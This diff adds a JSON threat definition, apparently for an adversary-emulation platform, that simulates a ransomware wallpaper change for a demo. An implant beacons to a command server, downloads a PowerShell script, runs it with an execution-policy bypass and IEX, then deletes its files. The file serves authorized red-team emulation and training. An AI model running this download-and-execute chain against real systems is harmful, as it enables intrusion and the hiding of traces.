@@ -1,0 +1,63 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Background Changes with Cleanup",
+        "display_name": "BGChangeThreat",
+        "name": "BGChangeThreat",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"icsvillage.scythedemo.com:443\",\"--secure\":true}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "2": {
+                "module": "downloader",
+                "request": "--src VFS:/shared/Ransomware/lockedlowres.jpg --dest %USERPROFILE%/AppData/Local/Temp/desktop.jpg",
+                "type": "message"
+            },
+            "3": {
+                "module": "downloader",
+                "request": "--src VFS:/shared/Ransomware/wallchange.ps1 --dest %USERPROFILE%/AppData/Local/Temp/wallchange.ps1",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "request": "--load run",
+                "type": "message"
+            },
+            "5": {
+                "module": "run",
+                "request": "powershell Set-ExecutionPolicy Bypass; IEX -command $ENV:UserProfile\\appdata\\local\\temp\\wallchange.ps1",
+                "type": "message"
+            },
+            "6": {
+                "module": "run",
+                "request": "powershell Remove-Item \"%USERPROFILE%/AppData/Local/Temp/wallchange.ps1\"",
+                "type": "message"
+            },
+            "7": {
+                "module": "run",
+                "request": "powershell Remove-Item \"%USERPROFILE%/AppData/Local/Temp/desktop.jpg\"",
+                "type": "message"
+            },
+            "8": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
